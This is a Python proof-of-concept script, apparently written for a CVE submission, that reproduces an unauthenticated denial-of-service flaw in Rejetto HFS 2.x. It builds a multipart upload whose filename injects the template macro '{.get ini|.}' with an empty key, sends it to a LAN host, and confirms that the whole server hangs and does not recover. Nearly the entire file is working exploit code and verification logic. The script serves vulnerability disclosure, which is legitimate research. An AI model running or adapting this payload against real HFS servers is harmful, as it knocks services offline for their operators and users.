#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Deliberate reproduction of vuln-0010: unauthenticated DoS via the
`{.get ini|.}` empty-key infinite loop in getKeyFromString (HFS 2.x).

Instrumentation, in order:
  1. baseline: GET / (status + latency), listener state, hfs PID
  2. deliver the payload through the upload-filename template injection
  3. does an UNRELATED client still get served?  (proves the whole
     single-threaded server is blocked, not just our own request)
  4. listener state + process state: OPEN-but-unresponsive (hang) vs
     CLOSED (that would be the separate `stop server` finding)
  5. leave the service hung; restart and recovery are handled by the caller

Writes every observation to ../evidence/09-dos-getini.txt
"""
import os
import socket
import subprocess
import sys
import time

HOST, PORT = "192.168.1.235", 8090
OUT = "D:/Desktop/gen/cve/submission/rejetto_hfs2_getini-infinite-loop-dos/evidence/09-dos-getini.txt"
BOUNDARY = "X"
PAYLOAD = "%item-resource%:}{.get ini|.}"          # empty key
CONTROL = "%item-resource%:}{.get ini|hints4newcomers.}"   # non-empty key observed working earlier

log_lines = []


def log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    print(line)
    log_lines.append(line)


def tcp_open(timeout=3):
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.close()
        return True
    except Exception:
        return False


def http_get(path="/", timeout=4):
    """Return (status_line, latency, body_len) or (None, latency, 0) on timeout."""
    t0 = time.time()
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        try:
            s.sendall(("GET %s HTTP/1.1\r\nHost: %s:%d\r\nConnection: close\r\n\r\n"
                       % (path, HOST, PORT)).encode())
            data = s.recv(4096)
            dt = time.time() - t0
            if not data:
                return None, dt, 0
            return data.split(b"\r\n")[0].decode("latin-1", "replace"), dt, len(data)
        finally:
            s.close()
    except Exception as e:
        return None, time.time() - t0, 0


def hfs_pid():
    try:
        out = subprocess.run(
            ["powershell", "-NoProfile", "-Command",
             "(Get-Process -Name hfs -ErrorAction SilentlyContinue | Select-Object -First 1 -ExpandProperty Id)"],
            capture_output=True, text=True, timeout=20)
        v = out.stdout.strip()
        return v or None
    except Exception:
        return None


def inject(filename, timeout=12):
    """Send the payload; return (responded, latency). Never raises on timeout."""
    body = (b"--" + BOUNDARY.encode() + b"\r\n"
            + b'Content-Disposition: form-data; name="f"; filename="'
            + filename.encode("latin-1") + b'"\r\n'
            + b"Content-Type: application/octet-stream\r\n\r\nhi\r\n--"
            + BOUNDARY.encode() + b"--\r\n")
    req = ("POST / HTTP/1.1\r\nHost: %s:%d\r\n"
           "Content-Type: multipart/form-data; boundary=%s\r\n"
           "Content-Length: %d\r\nConnection: close\r\n\r\n"
           % (HOST, PORT, BOUNDARY, len(body))).encode("latin-1") + body
    t0 = time.time()
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        try:
            s.sendall(req)
            data = s.recv(4096)
            dt = time.time() - t0
            return (bool(data), dt, data[:200].decode("latin-1", "replace"))
        finally:
            s.close()
    except Exception:
        return (False, time.time() - t0, "<client read timed out>")


def main():
    log("=== vuln-0010 reproduction: {.get ini|.} empty-key infinite loop ===")
    log("target %s:%d   payload filename: %s" % (HOST, PORT, PAYLOAD))

    # ---- 1. baseline -------------------------------------------------------
    log("")
    log("STEP 1  baseline")
    st, dt, n = http_get("/")
    log("  GET /                  -> %s  (%.3fs, %d bytes)" % (st, dt, n))
    log("  listener OPEN          -> %s" % tcp_open())
    pid0 = hfs_pid()
    log("  hfs.exe PID            -> %s" % pid0)
    if st is None:
        log("ABORT: service is not serving before the test; nothing to measure.")
        return 1

    # ---- control: a NON-empty key must return quickly and must not hang -----
    log("")
    log("STEP 2  control request with a NON-empty key (must not hang)")
    ok, dt, body = inject(CONTROL)
    log("  {.get ini|hints4newcomers.} -> responded=%s (%.3fs)" % (ok, dt))
    st2, dt2, _ = http_get("/")
    log("  GET / after control    -> %s  (%.3fs)  [service healthy]" % (st2, dt2))

    # ---- 2. deliver the payload --------------------------------------------
    log("")
    log("STEP 3  deliver the payload (empty key)")
    ok, dt, body = inject(PAYLOAD, timeout=25)
    log("  {.get ini|.}           -> responded=%s after %.2fs  %s" % (ok, dt, body))
    log("  (a client read timeout with no HTTP response is the expected observation)")

    # ---- 3. is an UNRELATED client still served? ---------------------------
    log("")
    log("STEP 4  unrelated client, repeatedly, to see whether the whole server is blocked")
    for i in range(1, 7):
        st3, dt3, _ = http_get("/", timeout=4)
        log("  probe %d  GET /        -> %s  (%.3fs)" % (i, st3, dt3))
        time.sleep(1)

    # ---- 4. listener vs process state --------------------------------------
    log("")
    log("STEP 5  listener state vs process state (hang vs shutdown)")
    openp = tcp_open()
    pid1 = hfs_pid()
    log("  TCP connect %s:%d      -> %s" % (HOST, PORT, "OPEN (port bound)" if openp else "CLOSED/refused"))
    log("  hfs.exe PID            -> %s (alive=%s)" % (pid1, pid1 == pid0 and pid1 is not None))
    if openp and st3 is None:
        log("  => VERDICT: listener bound but not serving = serving thread hung (NOT a shutdown)")
        log("     This distinguishes it from the `stop server` finding, where the port closes.")
    elif not openp:
        log("  => port closed: process is gone (would be the shutdown case, not this finding)")

    # ---- 5. persistence ----------------------------------------------------
    log("")
    log("STEP 6  does it self-recover?  (60s wait)")
    for i in range(6):
        time.sleep(10)
        st4, dt4, _ = http_get("/", timeout=4)
        log("  +%2ds  GET /            -> %s  (%.3fs)" % ((i + 1) * 10, st4, dt4))
        if st4:
            log("  => recovered on its own")
            break
    else:
        log("  => NO self-recovery after 60s; an external restart is required")

    with open(OUT, "w", encoding="utf-8", newline="\n") as f:
        f.write("\n".join(log_lines) + "\n")
    print("\nwrote", os.path.abspath(OUT))
    return 0


if __name__ == "__main__":
    sys.exit(main())
